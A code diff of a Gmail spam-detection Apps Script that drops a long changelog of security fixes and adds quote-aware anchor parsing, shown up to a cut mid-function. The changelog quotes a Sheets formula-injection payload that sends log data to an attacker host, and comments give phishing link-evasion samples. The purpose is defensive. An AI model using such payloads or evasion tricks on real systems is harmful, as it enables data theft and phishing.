@@ -1,6 +1,6 @@
 /**
  * Gmail Spam Detector - Google Apps Script
- * @version 6.48.2
+ * @version 6.49.0
  *
  * Automated spam detection and destruction for Gmail. Runs on a 1-minute
  * trigger (a scheduled task), scanning the inbox for unprocessed emails and
@@ -31,464 +31,10 @@
  *   Rule 7: CTA link text names a document brand the href does not belong to → phishing
  *           (QUARANTINED: archived + labelled, never deleted — see quarantineAsPhishing)
  *
- * Changelog (see git log for full history):
- *   v6.48.2: Stop buffering raw message content. Completes the v6.47.0 memory
- *            fix, which was only half done: archiveRawEml() writes the EML to
- *            Drive synchronously, so nothing reads entry.rawContent again, yet
- *            it was still stored on every buffered log entry. That held up to
- *            CONFIG.maxEmailsPerRun full raw messages in memory until the
- *            flush — 50 x potentially 25MB, because getRawContent() is not
- *            bounded by CONFIG.maxEmailSizeBytes (that guard reads getBody()).
- *            The buffer now holds only the small Sheets row.
- *   v6.48.1: Remove the unused script.external_request OAuth scope.
- *            Nothing in this file has ever called UrlFetchApp — verified zero
- *            references — so the one scope that grants outbound network access
- *            was pure downside. Without it, code running in this project can
- *            read and delete mail but cannot send it anywhere: destruction is
- *            possible, exfiltration is not.
- *            NOTE: narrowing a manifest does NOT prompt for re-consent, because
- *            the script is asking for a subset of what was already granted. The
- *            previously granted token stays broader until the user revokes
- *            access at myaccount.google.com and re-approves. Until then this
- *            change is declarative only.
- *            gmail.modify and gmail.labels are deliberately left in place: both
- *            are strict subsets of mail.google.com, which is required because
- *            gmail.modify cannot permanently delete. Removing them would change
- *            nothing but the consent screen wording, at some risk.
- *   v6.48.0: recheckRecentSpamChecked() holds for review instead of deleting.
- *            This path re-judges mail the user has ALREADY READ AND KEPT, and
- *            it is forced to run within a minute of every deploy. Until now it
- *            called disposeDetectedMessage(), so a newly deployed pattern
- *            permanently deleted up to 20 such messages immediately, with
- *            nothing between a new regex and the loss but a 22-file ham corpus.
- *            It was the highest-blast-radius consequence of a bad pattern in
- *            the system and the one most likely to be exercised, because a
- *            pattern is added precisely when it is new and unproven.
- *            New holdForReview() archives the message out of the inbox and
- *            labels it CONFIG.reviewLabel. The inbox still gets cleaned and the
- *            recheck query (scoped to in:inbox) will not see it again, but
- *            nothing is destroyed. No SPAM label is applied, so destroySpam()
- *            can never reach it either.
- *            The same reasoning that gave Rule 7 a quarantine applies with more
- *            force here: on the day a pattern changes, every rule has an
- *            unproven false-positive class. checkFalseNegatives() still
- *            deletes, and that asymmetry is deliberate — a manual SpamMissed
- *            label is the user ASKING for destruction, whereas the recheck is
- *            the script overruling a decision the user already made.
- *            Also centralised the review label as CONFIG.reviewLabel (it was
- *            hardcoded in four places) and added seven disposition assertions
- *            covering the hold path.
- *   v6.47.1: Documentation accuracy pass. No behaviour change.
- *            docs/index.html is the published GitHub Pages site and was stale on
- *            nearly everything: six rules instead of seven (so it stated that
- *            every detection is permanently deleted), a reportSpam() function
- *            that does not exist, a feature vector in which not one field name
- *            was real, three different wrong ham counts, a claim that Gmail's
- *            Spam folder never auto-clears used to justify behaviour since
- *            removed, an assertion that GitHub/Stripe/PayPal/banks ship
- *            whitelisted when they do not, and a description of the folder-wide
- *            sweep as a safety feature. All corrected, Rule 7 and the
- *            quarantine documented, and the real nine-field signal object
- *            published for the ML dataset section.
- *            README: signal list said 6 in one place and 8 in another against 9
- *            in code; rule list said 4 against 7; "~120 lines of detection
- *            logic" was off by 3x; the Vaporizer section still promised
- *            everything is deleted. Added a labels table — five labels appear
- *            in the sidebar and the docs named two.
- *            docs/SPAM_LOGGING_PLAN.md marked as shipped rather than
- *            "approved for implementation", with the schema enum and rule range
- *            corrected. docs/EXPORTING_EMAILS.md lost the completed
- *            PDF-to-.eml migration instructions and gained a section on
- *            actually adding a fixture to the corpus.
- *   v6.47.0: Security hardening after an external review declined sign-off.
- *            Six findings, all verified by running the shipped code.
- *            (1) ARCHIVE-BEFORE-DELETE WAS NOT REAL. Four comments asserted it;
- *            none were true. accumulateLogEntry() only buffered, and the Drive
- *            write happened in flushSpamLog() AFTER the thread loop, so the
- *            actual order was batchDelete then archive. A 6-minute timeout, an
- *            unset SPAM_LOG_FOLDER_ID, a memory kill or a throw from
- *            maintenance each destroyed mail with no copy, and the buffer is
- *            cleared in a finally so nothing carried over. The recovery story
- *            the v6.44.0 post-mortem relied on did not exist. New
- *            archiveRawEml() writes the EML synchronously and reports success;
- *            disposeDetectedMessage() now REFUSES the destructive branch
- *            without it and holds the message for review instead. The
- *            invariant is enforced in code and asserted in tests rather than
- *            described in comments.
- *            (2) SHEETS FORMULA INJECTION. setValues() evaluates formulas — the
- *            code depends on that for its =HYPERLINK column — and the Subject,
- *            display name, address and Reply-To were written raw. A subject of
- *            =IMPORTXML("https://attacker/?x="&ENCODEURL(JOIN(",",A2:R500)))
- *            fires on document open in the user's authenticated session and
- *            exfiltrates the whole detection log. New escapeSheetCell()
- *            apostrophe-prefixes anything starting with = + - @ tab or CR, and
- *            caps cell length: an over-long subject used to make setValues()
- *            throw, discarding the log rows for an entire batch of
- *            already-deleted mail.
- *            (3) QUADRATIC REGEX DoS. Fifteen patterns have the shape X.*Y,
- *            which backtracks quadratically when X matches often. Measured: a
- *            100KB subject of "Trump " cost 3.5s, and 200KB across
- *            subject+from cost 14s — one email blowing the 6-minute budget,
- *            killing the run before threads are labelled so the next trigger
- *            repeats it forever, a self-sustaining denial of detection. The
- *            100 000-char cap bounded nothing useful. Added maxSubjectChars
- *            (2000) and maxFromChars (500). The ReDoS analysis comment was
- *            wrong and said so confidently; corrected.
- *            (4) OVERSIZE-BODY BYPASS. A body over maxEmailSizeBytes was
- *            skipped unevaluated and then stamped SpamChecked, so padding the
- *            HTML defeated all seven rules at zero cost and the message was
- *            never reconsidered. Such threads are now flagged SuspectedSpam.
- *            (5) WHITESPACE PLAIN PART. A text/plain body of one space is
- *            truthy, so the HTML fallback never ran and Signals 2b, 2c and 2d
- *            all saw an empty body. One space disabled every body signal.
- *            Fixed with .trim().
- *            (6) cleanseInbox() still had the substring whitelist/blacklist
- *            matcher that v6.42.0 fixed in collectSignals() only — and matched
- *            the DISPLAY NAME, so "Dragonfly Capital" was whitelisted and
- *            "FinanceBuzz Weekly" from a legitimate domain was permanently
- *            deleted, with no archive at all. It hand-rolled the pipeline and
- *            then called analyzeMessage() anyway; the duplicate is deleted and
- *            it now shares one code path.
- *            Also: isBulkEmail() scans the first 64KB rather than lowercasing
- *            a 25MB message; checkFalseNegatives() gained the result cap every
- *            other search already had, and honours the archive invariant;
- *            removed dead refreshWhitelist/refreshBlacklist (77 lines, obsolete
- *            since v6.35.0) and the dead phishing-label block in destroySpam();
- *            corrected four factually wrong comments; scripts/validate.py is
- *            wired into CI and its broken README-tag check replaced with an
- *            @version/SCRIPT_VERSION agreement check; CI path filters now
- *            include scripts/, .claspignore and docs/ — the files that broke
- *            four deploys did not trigger the workflow.
- *   v6.46.0: Scope the spam sweep to this detector's own verdicts. destroySpam()
- *            deleted the ENTIRE Spam folder every few minutes — including mail
- *            Gmail's classifier filed, which this script never evaluated. That
- *            path calls neither accumulateLogEntry() nor the Drive archiver, so
- *            a Gmail false positive was destroyed permanently, unlogged and
- *            unrecoverable, within minutes. The docstring described clearing
- *            "pre-existing spam" as a feature; it was the largest irreversible
- *            data-loss path in the system by volume, and v6.44.0 shrank the
- *            window from 15 to 5 minutes without recognising that.
- *            markAsSpam() now tags each message with CONFIG.purgeLabel in the
- *            same modify() call that reports it as spam, before attempting the
- *            delete, and destroySpam() lists the label INTERSECTION
- *            ['SPAM', purgeLabel]. Deliberately an intersection rather than a
- *            q: filter: a q: reads the eventually-consistent search index, and
- *            an index-lagged query is what destroyed a quarantined message on
- *            2026-09-16. If the tag is index-lagged the message is simply not
- *            swept this cycle — a delayed delete, not a premature one. If the
- *            label cannot be resolved at all the sweep runs on NOTHING rather
- *            than falling back to emptying the folder.
- *            Gmail purges its own Spam at 30 days, so the folder still gets
- *            cleared; the difference is that the user can now reach into it.
- *            New purgeAllSpamNow() keeps the empty-the-folder capability as a
- *            deliberate manual action rather than a background sweep.
- *            New getLabelId() resolves a label name to the REST API id
- *            (GmailApp label objects do not expose it), cached per execution.
- *            tests/test_disposition.js grew to 25 assertions: the tag is
- *            applied before the delete and in one call, our verdict IS swept,
- *            Gmail-classified spam is NOT, the scope is a label intersection
- *            with no q: filter, and the sweep refuses to run if the label
- *            cannot be resolved.
- *   v6.45.3: Stop clasp uploading Node test scripts. clasp treats ANY .js
- *            under rootDir as Apps Script source, and .claspignore's bare
- *            "*.js" matches only top-level files, so adding
- *            scripts/patch_version.js broke the deploy with "ParseError:
- *            Unexpected token ILLEGAL ... file: scripts/patch_version.gs".
- *            Added a scripts directory glob and a recursive .js glob (the
- *            latter cannot be written literally here — it would close this
- *            comment block). tests/test_patch_version.js now
- *            walks the repo for .js files and asserts each is excluded, so a
- *            future Node helper cannot break the deploy the same way.
- *   v6.45.2: Guard version extraction in the deploy workflow. grep -oP prints
- *            every match on its own line, so a commit subject naming two
- *            versions produced a multi-line $VERSION and broke the deploy.
- *            patch_version.js rejected it loudly; the sed it replaced would
- *            have mangled the source silently. head -n1 applied at all three
- *            extraction sites (patch, validate, tag). Keep commit subjects to
- *            one version string regardless.
- *   v6.45.1: Fix the deploy step that blocked v6.45.0. The anchored @version
- *            sed added in v6.43.0 had to survive YAML block-scalar, shell
- *            double-quote and sed-expression quoting at once; it parsed on BSD
- *            sed locally and failed on GNU sed in CI with "unterminated `s'
- *            command", after the test job had already gone green. So v6.45.0's
- *            code was never deployed. Replaced by scripts/patch_version.js,
- *            covered by tests/test_patch_version.js in the test job, so a
- *            broken version patch now fails tests rather than the deploy.
- *   v6.45.0: Hardening pass on v6.42.0-v6.44.0 after external review. Six
- *            defects, four of them verified by running the live code:
- *            (1) Quarantine was not terminal. processInbox() skipped the
- *            SpamChecked label whenever spamCount > 0, an invariant that meant
- *            "thread was deleted" until Rule 7 started leaving threads alive.
- *            A quarantined thread still holding INBOX (a reply-chain lure
- *            leaves a sibling there, or the user un-archives it) was
- *            re-detected every minute: ~1440 PHISHING_DETECTED rows and Drive
- *            EMLs per day, corrupting the detection log that exists to train a
- *            model. processThread() now reports `destroyed` explicitly,
- *            quarantine applies processedLabel, and both search queries
- *            exclude phishingLabel.
- *            (2) addressMatchesDomain()'s substring fallback matched the LOCAL
- *            PART, which is attacker-chosen: dragonfly@attacker.tld was
- *            WHITELISTED (a free bypass of the whole detector, from a list
- *            published in this repo) and financebuzz@realcompany.com was
- *            BLACKLISTED, i.e. Rule 1, i.e. permanently deleted. Nine
- *            blacklist entries have no dot, so the delete path was broadly
- *            exposed. Fallback now tests the host only, and '@' entries must
- *            end on a domain-label boundary.
- *            (3) 'signnow' removed from BRAND_CTA_DOMAINS. Anchor text is
- *            normalized by stripping non-alphanumerics, so the ordinary button
- *            label "Sign Now" collapsed to "signnow" and fired Rule 7 on
- *            legitimate Ironclad and BambooHR buttons.
- *            (4) TRACKER_LABELS was a one-CNAME bypass: r.evil.com or
- *            click.evil.com made Signal 7 abstain regardless of who owned the
- *            parent domain. The original Capital B lure would have escaped for
- *            the cost of one DNS record. The label heuristic now requires the
- *            parent to be sender-aligned, which is the only shape it actually
- *            models; third-party ESP trackers still match by domain.
- *            (5) The 60-char CTA cap measured raw text, so zero-width padding
- *            (JS \s does not match U+200B) and plain verbosity both evaded it
- *            — a natural 67-char label was invisible. Now measured on the
- *            normalized alphanumeric text at 80.
- *            (6) hasBrandMismatchedCta() received the sanitizeInput()-truncated
- *            body, capping HTML at 100 000 chars. That made
- *            LIMITS.maxHtmlScanChars dead config and hid any CTA past 100KB,
- *            which real marketing HTML with inlined CSS routinely exceeds. It
- *            now gets the untruncated body; extractAnchors() is independently
- *            bounded, which was the point of those limits.
- *            Also: disposeDetectedMessage() allowlists the destructive branch
- *            instead of defaulting to it, so an unidentifiable verdict
- *            quarantines rather than deletes; _quarantinedThisRun (which
- *            disabled the entire spam sweep for a whole execution) replaced by
- *            per-id exclusion; recheckRecentSpamChecked() gated on version
- *            change plus a 30-minute floor rather than the 5-minute timer,
- *            since its trigger is a pattern change, not the clock.
- *            New tests/test_disposition.js — 18 assertions, wired into CI —
- *            is the first automated coverage of the code that irreversibly
- *            deletes mail, and regression-tests both the 2026-09-16 incident
- *            and the re-quarantine loop.
- *   v6.44.0: CRITICAL FIX — a quarantined phishing message was permanently
- *            deleted. On 2026-09-16 Rule 7 correctly caught
- *            "Capital B | Bitcoin Policy Brief" and quarantined it, logging
- *            PHISHING_DETECTED with signals BULK,BRAND_MISMATCH_CTA. Within
- *            the SAME execution, destroySpam() then batch-deleted it.
- *            Cause: quarantine moved the message to SPAM and relied on
- *            destroySpam()'s "-label:Phishing" query to spare it. That query
- *            reads Gmail's SEARCH INDEX, which is eventually consistent. The
- *            Phishing label had been applied seconds earlier, the index did
- *            not reflect it yet, and the message was swept. v6.43.0 made this
- *            certain rather than merely possible by forcing the maintenance
- *            cycle in the same execution as detection.
- *            Fix is structural, not a better query: quarantine no longer
- *            applies the SPAM label at all. It archives (removes INBOX) and
- *            labels. destroySpam() lists labelIds:['SPAM'], so a message that
- *            never carries that label cannot be swept regardless of index
- *            state — the race is gone by construction rather than narrowed.
- *            Cost: Gmail's classifier no longer learns from Rule 7 hits. That
- *            is the right trade — Rule 7 is the one rule with an irreducible
- *            false-positive class, and not destroying mail outranks filter
- *            training. Rules 1-6 still report to SPAM and still delete.
- *            Added _quarantinedThisRun as a safety interlock so any future
- *            change that reintroduces a SPAM move cannot silently recreate
- *            the race. Also reduced the maintenance interval from 15 to 5
- *            minutes (quota math in runPeriodicMaintenance).
- *            The deleted message was recoverable: v6.32.0 archives the raw
- *            EML to Drive BEFORE deletion, which is the only reason this was
- *            a recoverable incident rather than permanent data loss.
- *   v6.43.0: Restore prompt post-deploy recatch. v6.36.0 promised that a fix
- *            deploy cleans up after itself unattended, and before v6.40.0 it
- *            did: recheckRecentSpamChecked() ran on every 1-minute invocation,
- *            so a newly-deployed pattern re-caught its target within about a
- *            minute. v6.40.0 moved maintenance behind a 15-minute gate for
- *            performance and silently made that up to 15x slower, which is why
- *            a freshly deployed fix appears to do nothing for a quarter hour.
- *            runPeriodicMaintenance() now forces one immediate cycle when
- *            SCRIPT_VERSION differs from the last version recorded in Script
- *            Properties. Once per deploy, not once per minute, so the v6.40.0
- *            performance win is kept. LAST_SEEN_VERSION is written BEFORE the
- *            cycle runs so a throwing maintenance function cannot force a
- *            fresh cycle every minute and burn Gmail API quota.
- *            Chosen over a CI step that calls the Apps Script Execution API:
- *            no manifest executionApi block, no API-executable deployment, no
- *            extra OAuth scopes, and it also covers deploys made outside CI
- *            (manual clasp push, or an edit in the Apps Script editor).
- *            SCRIPT_VERSION is patched by the deploy workflow in its own sed,
- *            separate from the header tag, and verified by grep so a silent
- *            patch failure fails the deploy rather than disabling detection.
- *   v6.42.0: Catch brand-mismatched CTA phishing — the first signal that reads
- *            the LINK GRAPH instead of sender-side vocabulary.
- *            Missed email: "Capital B | Bitcoin Policy Brief" from
- *            info@cptlbnews.press (a cousin of the real cptlb.com), sent via
- *            Resend over Amazon SES. It scored ZERO on all eight existing
- *            signals except bulk — no clickbait, no fear, no Unicode
- *            obfuscation, valid SPF+DKIM for its own domain, a real corporate
- *            footer with a real Euronext ticker, and hedged modal prose
- *            throughout ("a reported 7-10% withholding provision ... could
- *            apply"). Not a threshold miss; a total signal vacuum. The only
- *            evidence in the message was its links: a button reading
- *            "VIEW IN DOCUSIGN" pointing at cptlbpolicy.com.
- *            Added: (1) Signal 7 / Rule 7 — hasBrandMismatchedCta() fires when
- *            anchor text names a BRAND_CTA_DOMAINS key, carries a CTA verb and
- *            normalizes to <=80 chars (a button label, not prose), while the href host
- *            belongs to neither that brand, a known link wrapper, nor the
- *            sender. Not gated on bulk — this class also arrives via
- *            compromised accounts, the same reasoning Rule 6 accepted.
- *            (2) LINK_WRAPPER_DOMAINS + TRACKER_LABELS — the signal ABSTAINS
- *            on click-trackers and CNAMEd trackers. A wrapped destination is
- *            unverifiable, not malicious. This abstention is load-bearing:
- *            ablation shows that without it, a legitimate SendGrid-tracked
- *            invoice with a "View in DocuSign" button false-positives.
- *            (3) extractUrlHost() / hostMatchesDomain() — host parsing that
- *            resists the docusign.net.evil.com suffix bug, the notdocusign.net
- *            prefix bug, and the docusign.net@evil.com userinfo trick.
- *            (4) decodeHtmlEntities() and nested-tag stripping, so
- *            "D&#111;cu&shy;Sign" and "<span>Docu</span><span>Sign</span>"
- *            still match. Entity decoding is load-bearing, not cosmetic.
- *            SECURITY FIX (unrelated to the miss, found while reviewing the
- *            same function): whitelist and blacklist matching used substring
- *            comparison, so "mail@linkedin.com.secure-login.top" and
- *            "a@notlinkedin.com" were WHITELISTED and skipped all detection.
- *            Now addressMatchesDomain() — exact or dot-suffix.
- *            Rule 7 QUARANTINES rather than deletes: reported to Gmail as spam
- *            and labelled "Phishing", but no batchDelete, so it stays
- *            recoverable. destroySpam()'s sweep excludes that label — without
- *            that exclusion the quarantine would be silently destroyed within
- *            one 15-minute maintenance cycle. Routing lives in
- *            disposeDetectedMessage() so processThread() and
- *            recheckRecentSpamChecked() cannot drift; checkFalseNegatives()
- *            deliberately still deletes, because a manual "SpamMissed" label
- *            is an explicit human instruction.
- *            Also: truncate before stripHtmlTags() rather than after (was
- *            running two regex passes over up to 5MB); add serviceImpersonation
- *            and brandMismatchedCta to debugWhyFlagged(), which has under-
- *            reported since v6.38.0; log Rule 7 as PHISHING_DETECTED.
- *   v6.41.0: Catch hardware-wallet phishing missed via legit SurveyMonkey
- *            sending infra ("🔐 System Configuration Notice" template).
- *            Three additions: (1) 🔐 added to clickbait emoji cluster — phishing
- *            "security notice" decoration that legit 2FA/security mail (Google,
- *            Apple, GitHub) does not lead with. (2) Two new BODY_CRYPTO_PATTERNS:
- *            \bhardware wallet\b and a tight wallet/firmware "manual update"
- *            phrase (deliberately excludes "device" to avoid FP on legit Apple/
- *            IT iOS-update mail). (3) New BODY_FEAR_PATTERNS array (Signal 2c)
- *            for phishing-specific conditional-fear body phrases — "your access
- *            could be compromised". Legit security alerts use definitive past
- *            tense ("was compromised"); conditional future ("could be") is the
- *            phishing tell. Each match increments clickbaitCount. Together fire
- *            Rule 4 (3+ clickbait) regardless of whether SurveyMonkey infra is
- *            bulk-detected. Added ham FP guards: Apple iOS update notice +
- *            Google 2FA setup (subject decorated with 🔐).
- *   v6.40.0: Performance overhaul for 1-minute trigger intervals. Five changes:
- *            (1) Fast-path exit — processInbox() returns after a single
- *            GmailApp.search() when no threads are found; no label lookup,
- *            no body fetches, no maintenance. (2) Periodic maintenance —
- *            checkFalseNegatives(), recheckRecentSpamChecked(), and
- *            destroySpam() run at most every 15 min via a Script Properties
- *            timestamp instead of every invocation. (3) getMessagesForThreads()
- *            batching — N thread.getMessages() calls collapsed to 1 batched
- *            API call in processInbox() and recheckRecentSpamChecked().
- *            (4) Whitelist-first in collectSignals() — sender whitelist checked
- *            immediately after getFrom(), skipping getRawContent() for known-
- *            good senders. (5) Domain list caching — getWhitelist()/getBlacklist()
- *            called once per execution via _cachedWhitelist/_cachedBlacklist.
- *   v6.39.0: Catch political-financial scam miss (economicrulebook.com). Add
- *            iterable.com to BULK_EMAIL_FINGERPRINTS (Iterable marketing
- *            platform). Add two clickbait patterns: political-looting narrative
- *            ("ripped off", "looted", "robbed", "bilked") and payback/revenge
- *            framing ("payback time", "now it's time"). Blacklist
- *            economicrulebook.com. Together these fire Rule 2 (bulk + 2
- *            clickbait) and Rule 1 (bulk + blacklist) on "America Was Ripped
- *            Off for 50 Years – Now It's Payback Time" class emails. Also add
- *            BODY_UNICODE_PATTERNS — Cyrillic/Greek/fullwidth/math-alphanumeric
- *            check against the email body (Signal 2d). Previously these Unicode
- *            obfuscation patterns only fired on subject+from; spammers evade
- *            that by embedding obfuscated text in HTML body anchors.
- *   v6.38.1: Fix logging for Rule 6. getRuleFromSignals() and buildSignalsCsv()
- *            were not updated when Rule 6 was added — phishing emails logged
- *            Rule=NONE, empty signals, and Log Type=SPAM_DETECTED. Now logs
- *            Rule 6, SERVICE_IMPERSONATION in signals, and PHISHING_DETECTED
- *            as the log type so phishing rows are visually distinct.
- *   v6.38.0: Rule 6 — service impersonation phishing detection. Adds
- *            IMPERSONATION_SUBJECT_PATTERNS (cloud service share notification
- *            subjects) and CLOUD_SERVICE_DOMAINS (trusted sender domains).
- *            Emails whose subject matches a known cloud service notification
- *            template (e.g. "Document shared with you") but whose sender is
- *            not from the expected service domain are classified as phishing
- *            without requiring bulk email infrastructure — compromised
- *            legitimate accounts are the typical delivery vector.
- *   v6.37.0: Three operational fixes. (1) Lock-skip log visibility: logDebug →
- *            logInfo so a blocked manual trigger shows "Skipping run — previous
- *            execution still in progress" instead of silence. (2) Mailchimp bulk
- *            detection: add mcsv.net to BULK_EMAIL_FINGERPRINTS so Mailchimp-
- *            routed spam is recognised as bulk email. (3) Military pattern: extend
- *            to attacks?|attacking so "-ing" verb forms fire the clickbait signal.
- *   v6.36.0: Auto-recheck false negatives — recheckRecentSpamChecked() runs at the
- *            end of every processInbox() trigger cycle. Re-evaluates inbox emails
- *            carrying SpamChecked from the last 2 days against current patterns.
- *            Any that now score as spam are logged FALSE_NEGATIVE and deleted
- *            automatically — no manual SpamMissed labeling needed after a fix deploy.
- *   v6.35.0: Catch health/political spam miss (finrisex.com). Blacklist finrisex.com.
- *            Whitelist conservativebc.ca. Add MAHA to celebrity pattern + "report"
- *            as a trailing verb. Expand STOP imperative to include "putting/eating/
- *            drinking". Add suppression conspiracy pattern ("watch before this gets
- *            buried"). Fix domain-list architecture: getBlacklist()/getWhitelist()
- *            now merge DEFAULT_DOMAINS directly at runtime so new source-code
- *            entries are live immediately after deploy — no manual refreshBlacklist()
- *            / refreshWhitelist() call needed ever again.
- *   v6.34.0: Add LockService guard to processInbox() — prevents overlapping
- *            executions when a run takes longer than the trigger interval.
- *            tryLock(0) skips (rather than queues) concurrent invocations.
- *   v6.33.0: Remove fixSheetHyperlinks() — one-time migration utility, already
- *            run. Dead code.
- *   v6.32.0: Spam intelligence logging — every detected spam is archived as a
- *            raw EML in Google Drive (Spam Intelligence/Detected/) and
- *            logged as a structured row in a Google Sheets spreadsheet (19 cols:
- *            timestamp, log type, IDs, Drive URL, sender info, rule fired,
- *            signals, and manual notes columns). False negatives supported via
- *            "SpamMissed" Gmail label — user labels escaped spam, next run logs
- *            and deletes it, populating a FALSE_NEGATIVE row. New functions:
- *            setupLogging() (one-time setup), checkFalseNegatives(),
- *            accumulateLogEntry(), flushSpamLog(), getOrCreateLogSubfolder(),
- *            getRuleFromSignals(), buildSignalsCsv(). Logging is fully
- *            non-blocking — any Drive/Sheets failure is caught and logged
- *            without affecting spam deletion. New OAuth scopes: drive,
- *            spreadsheets. Run setupLogging() once after deploy to authorize.
- *   v6.31.0: Blacklist 1stamericanpath.com (Pre-IPO investment spam mill).
- *            Fix stock price pattern to also match $X/share (slash separator).
- *   v6.30.0: Blacklist morningstockadviser. Add income-opportunity clickbait
- *            pattern (second/passive/extra/side income).
- *   v6.29.0: Security hardening — fix display-name spoofing bypass (whitelist/
- *            blacklist now match against extracted email address only, not full
- *            From string). Add stripHtmlTags() HTML body fallback so
- *            BODY_CRYPTO_PATTERNS fire on HTML-only emails. Add Phase 5 edge
- *            case tests, Phase 6 performance benchmark, ReDoS analysis comment.
- *            Pin clasp@3.3.0 in CI. Delete stale archive/.
- *   v6.28.0: Catch homoglyph-obfuscated health spam (frontiercapitalreport.com).
- *            Add Unicode homoglyph pattern to CLICKBAIT_PATTERNS.
- *   v6.27.0: Comment pass + README/CI fixes for 1st-year CS student clarity.
- *   v6.26.0: Harden test parser — state machine bracket tracking, flag
- *            validation, pattern count cross-checks, parser self-tests.
- *   v6.25.0: Option B — test suite parses SpamDetector.gs directly (single
- *            source of truth). Tests extract all patterns at import time;
- *            no pattern duplication between source and tests.
- *   v6.24.0: L3/L5 review fixes — RFC2822_QUOTED_NAME constant, Rule 0→1 comments,
- *            maxAllowedEmailsPerRun/maxAllowedDaysToCheck into LIMITS, empty-domain
- *            guard on addToWhitelist/addToBlacklist, \uD835 surrogate explanation.
- *   v6.23.0: Extract BULK_EMAIL_FINGERPRINTS constant + isBulkEmail() helper.
- *            Fixes cleanseInbox() missing toLowerCase and test_spam_detector.py missing x-ses-.
- *   v6.22.0: Improve all comments for clarity at introductory CS level.
- *            Fix @version tag, rule numbering in header and docstrings,
- *            plain-English explanations for ReDoS, log injection, RFC 2822.
- *   v6.21.0: CS professor refactor — JSON.parse fallback on corrupt Script
- *            Properties, patterns to module-level constants, split
- *            analyzeMessage() into collectSignals()/makeVerdict(), named
- *            LIMITS constants, boolean return type, rules renumbered 1-5,
- *            debugWhyFlagged() uses production pipeline, removed dead code.
- *   v6.20.0: Detect payload delivery scams — empty subject + attachment (Rule 5).
- *            Scam hides payload inside Excel/PDF; add scam_examples/ test phase.
- *   v6.19.0: Detect crypto airdrop/wallet-drainer scams via body patterns.
- *            Add crypto quantity pattern (\d+ $TICKER) and body-only airdrop/
- *            connect-wallet check; each increments clickbaitCount → Rule 4.
- *   v6.18.0: Systemic RFC 2822 normalization fix. Normalize `from` once at top
- *            of signal collection; remove comma from marketing pattern (false
- *            positives on legit org names like "Bay Meadows, San Mateo").
+ * Changelog: see CHANGELOG.md. It is not reproduced here — it reached 459
+ * lines and three consecutive entries described three incompatible designs for
+ * the same function as if all were current, which made the live contract hard
+ * to find. This block documents only what is true NOW.
  *
  * Setup: See README.md or run setup() and follow the logs.
  */
@@ -524,7 +70,7 @@
  *
  * @const {string}
  */
-const SCRIPT_VERSION = '6.48.2';
+const SCRIPT_VERSION = '6.49.0';
 
 const CONFIG = Object.freeze({
   /** Max emails per run — prevents Apps Script 6-minute execution timeout */
@@ -657,6 +203,11 @@ const LIMITS = Object.freeze({
    *  fingerprints live in headers, so scanning the whole message (which can be
    *  25MB with attachments) only allocated a second copy of it. */
   maxRawScanChars: 65536,
+
+  /** Max characters scanned for a single opening <a ...> tag. Bounds the
+   *  quote-aware findTagEnd() scan; a real anchor tag with inline styles is
+   *  a few hundred characters. */
+  maxAnchorTagChars: 4000,
 
   /** Max characters of inner text read per anchor before giving up on </a>.
    *  Without this an unclosed <a> would scan to end-of-document, and N unclosed
@@ -2945,6 +2496,75 @@ function isLinkWrapperHost(host, senderHost)
  * @return {Array<Object>} At most LIMITS.maxAnchorsScanned objects with
  *                         `href` and `text` string properties.
  */
+function findTagEnd(html, startIdx, limit)
+{
+  // Quote-aware scan for the '>' that actually closes a tag.
+  //
+  // A regex like /<a\s[^>]*>/ terminates at the FIRST '>', including one
+  // inside a quoted attribute value. That made
+  //     <a title=">" href="https://evil.com/">VIEW IN DOCUSIGN</a>
+  // invisible to Signal 7: the "tag" ended at the title's '>', contained no
+  // href, and the scan resumed past the real one. Every mail client renders
+  // and navigates that anchor normally, so it was a zero-cost bypass.
+  //
+  // Character scan rather than regex: bounded, linear, no backtracking.
+  let quote = '';
+  const end = Math.min(startIdx + limit, html.length);
+
+  for (let i = startIdx; i < end; i++)
+  {
+    const c = html.charAt(i);
+
+    if (quote)
+    {
+      if (c === quote) quote = '';
+      continue;
+    }
+    if (c === '"' || c === "'") { quote = c; continue; }
+    if (c === '>') return i;
+  }
+
+  return -1; // unterminated within the bound
+}
+
+/**
+ * Pull every value of the given attributes out of a bounded HTML fragment.
+ *
+ * Used for two purposes: reading href off an anchor's own tag, and harvesting
+ * the accessible-name attributes (alt/title/aria-label) that a mail client
+ * shows the user but a tag-stripper throws away.
+ *
+ * Safe against ReDoS by construction — callers pass a fragment already bounded
+ * by maxAnchorTagChars or maxAnchorTextChars.
+ *
+ * @param {string} fragment - Bounded HTML.
+ * @param {string} namePattern - Alternation of attribute names, e.g. 'alt|title'.
+ * @return {Array<string>} Decoded values, in document order.
+ */
+function extractAttributeValues(fragment, namePattern)
+{
+  const out = [];
+  if (!fragment) return out;
+
+  const re = new RegExp(
+    // [\\s/] not just \\s: HTML5 allows '/' as an attribute separator, so
+    // <a/href="..."> is a valid anchor that clients navigate normally. Requiring
+    // whitespace made it invisible to Signal 7 for the cost of one character.
+    '[\\s/](?:' + namePattern + ')\\s*=\\s*(?:"([^"]*)"|\'([^\']*)\'|([^\\s"\'>]*))',
+    'gi');
+
+  let m;
+  while ((m = re.exec(fragment)) !== null)
+  {
+    if (m.index === re.lastIndex) { re.lastIndex++; continue; }
+    const v = m[1] !== undefined ? m[1] : (m[2] !== undefined ? m[2] : m[3]);
+    if (v) out.push(decodeHtmlEntities(v));
+    if (out.length >= 32) break; // a tag with 32 alt attributes is not real
+  }
+
+  return out;
+}
+
 function extractAnchors(html)
 {
   const out = [];
@@ -2954,41 +2574,66 @@ function extractAnchors(html)
     ? html.substring(0, LIMITS.maxHtmlScanChars)
     : html;
 
-  // Constructed FRESH on every call, NOT hoisted to module level. A /g RegExp
-  // is a stateful object: lastIndex survives between calls, so a shared
-  // instance driven by exec() would resume at the previous message's offset
-  // and silently skip anchors. Recompiling costs microseconds.
-  const openTag  = /<a\s[^>]{0,2000}>/gi;
-  const hrefAttr = /\shref\s*=\s*(?:"([^"]{0,2000})"|'([^']{0,2000})'|([^\s"'>]{0,2000}))/i;
+  const lower = scan.toLowerCase();
+  let searchFrom = 0;
 
-  let m;
-  while (out.length < LIMITS.maxAnchorsScanned && (m = openTag.exec(scan)) !== null)
+  while (out.length < LIMITS.maxAnchorsScanned)
   {
-    // Zero-length-match guard against an infinite loop. This pattern cannot
-    // match empty, but the idiom is free and the failure mode is a hung run.
-    if (m.index === openTag.lastIndex) { openTag.lastIndex++; continue; }
+    const tagStart = lower.indexOf('<a', searchFrom);
